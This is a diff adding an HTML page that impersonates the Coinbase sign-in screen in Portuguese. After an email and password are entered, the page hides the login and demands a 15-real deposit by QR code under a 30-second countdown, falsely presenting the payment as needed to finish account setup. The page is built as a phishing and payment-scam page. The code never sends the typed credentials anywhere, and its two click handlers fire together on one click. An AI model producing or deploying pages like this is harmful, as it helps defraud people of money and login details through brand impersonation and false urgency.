@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Coinbase</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #0A0B0D;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            position: relative;
+            color: #d1d1d1;
+        }
+
+        .login-container {
+            background-color: #0A0B0D;
+            padding: 40px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            border: 1px solid #24252A;
+            border-radius: 16px;
+            width: 450px; /* Largura aumentada */
+            height: 550px; /* Altura aumentada */
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .login-container h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #ffffff;
+            font-weight: bold;
+            text-align: left;
+            margin-left: 10px;
+        }
+
+        label {
+            font-size: 12px;
+            color: white;
+            font-weight: bold;
+            text-align: left;
+            margin-left: 10px;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        input[type="email"], input[type="password"] {
+            width: 90%;
+            padding: 14px;
+            margin: 10px 0;
+            background-color: #0A0B0D;
+            border: 1px solid #24252A;
+            border-radius: 4px;
+            font-size: 14px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            color: white;
+        }
+
+        .black-button {
+            width: 100%;
+            padding: 14px;
+            background-color: #578BFA;
+            color: #000000;
+            border: none;
+            border-radius: 16px;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 10px;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .black-button:hover {
+            background-color: #578BFA;
+        }
+
+        .line-separator {
+            margin: 20px 0;
+            font-size: 14px;
+            color: #fff;
+            position: relative;
+        }
+
+        .line-separator span {
+            margin: 0 10px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .line-separator::before, .line-separator::after {
+            content: "_______________";
+            color: #fff;
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        .line-separator::before {
+            left: 0;
+        }
+
+        .line-separator::after {
+            right: 0;
+        }
+
+        .action-buttons {
+            margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .action-buttons button {
+            width: 100%;
+            padding: 16px;
+            background-color: #32353D;
+            color: white;
+            border: none;
+            border-radius: 16px;
+            font-size: 15px;
+            cursor: pointer;
+            text-align: left;
+            padding-left: 20px;
+            font-weight: bold;
+        }
+
+        .action-buttons button:hover {
+            background-color: #2C2E32;
+        }
+
+        .info-text {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #A8A8A8;
+        }
+
+        .info-text a {
+            color: #A8A8A8;
+            text-decoration: none;
+            border-bottom: 1px solid #A8A8A8;
+        }
+
+        .info-text a:hover {
+            text-decoration: underline;
+        }
+
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 40px;
+            height: auto;
+        }
+
+        .signup-link {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 14px;
+            color: white;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .signup-link:hover {
+            text-decoration: none;
+        }
+
+        /* Informações de depósito */
+        #depositSection {
+            display: none;
+            background-color: #121314;
+            padding: 30px;
+            border-radius: 12px;
+            width: 400px;
+            color: white;
+            text-align: center;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+            font-weight: bold;
+        }
+
+        .deposit-message {
+            background-color: #32353D;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .deposit-message p {
+            margin: 0;
+        }
+
+        .qr-code img {
+            width: 180px;
+            height: 180px;
+            border-radius: 8px;
+            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .timer {
+            font-size: 20px;
+            margin-top: 20px;
+        }
+
+        #timerText {
+            color: #58C9A6;
+        }
+
+        .deposit-footer {
+            margin-top: 30px;
+            color: #A8A8A8;
+            font-size: 14px;
+        }
+
+        .deposit-footer a {
+            color: #A8A8A8;
+            text-decoration: none;
+        }
+
+        .deposit-footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <img src="home.png" alt="Logo" class="logo">
+
+    <a href="#" class="signup-link">Cadastre-se</a>
+
+    <div class="login-container" id="loginContainer">
+        <h1>Entrar na Coinbase</h1>
+        <form id="loginForm">
+            <label for="email" id="emailLabel">E-mail</label>
+            <input type="email" name="email" id="emailInput" placeholder="Email" required>
+            <button type="button" class="black-button" id="continueButton">continuar</button>
+        </form>
+
+        <div class="line-separator">
+            <span>OU</span>
+        </div>
+
+        <div class="action-buttons">
+            <button>Entrar com chave de acesso</button>
+            <button>Entrar com Google</button>
+            <button>Entrar com a Apple</button>
+            <button>Entrar com a Coinbase Wallet</button>
+        </div>
+
+        <div class="info-text">
+            <p>Esse dispositivo não é seu? Use uma<br>janela anônima. Consulte a nossa<br><a href="#">Política de privacidade</a> para mais<br>informações.</p>
+        </div>
+    </div>
+
+    <!-- Seção de informações de depósito -->
+    <div id="depositSection">
+        <div class="deposit-message">
+            <p>Você deve realizar o depósito de <strong>15 reais</strong> para finalizar a configuração da sua conta Coinbase.</p>
+        </div>
+        <div class="qr-code">
+            <img src="qrcode.JPEG" alt="QR Code" id="qrCodeImage">
+        </div>
+        <div class="timer" id="timer">
+            <span id="timerText">Tempo restante: 00:30</span>
+        </div>
+        <div class="deposit-footer">
+            <p>Para mais informações, consulte nossa <a href="#">Política de privacidade</a>.</p>
+        </div>
+    </div>
+
+    <script>
+        const continueButton = document.getElementById('continueButton');
+        const emailInput = document.getElementById('emailInput');
+        const emailLabel = document.getElementById('emailLabel');
+        const loginContainer = document.getElementById('loginContainer');
+        const depositSection = document.getElementById('depositSection');
+        const timerText = document.getElementById('timerText');
+        let timerInterval;
+
+        continueButton.addEventListener('click', () => {
+            const email = emailInput.value;
+
+            if (email) {
+                // Substituir o campo de email por senha e mudar o botão para "Entrar"
+                emailLabel.innerText = "Senha";
+                emailInput.setAttribute("type", "password");
+                emailInput.setAttribute("placeholder", "Senha");
+                continueButton.innerText = "Entrar";
+            }
+        });
+
+        continueButton.addEventListener('click', () => {
+            // Esconder o painel de login e mostrar as informações de depósito
+            loginContainer.style.display = 'none';
+            depositSection.style.display = 'block';
+
+            // Iniciar o temporizador
+            let timeLeft = 30;
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                timerText.innerText = `Tempo restante: 00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
+
+                if (timeLeft === 0) {
+                    clearInterval(timerInterval);
+                    timerText.innerText = "Tempo esgotado!";
+                }
+            }, 1000);
+        });
+    </script>
+
+</body>
+</html>
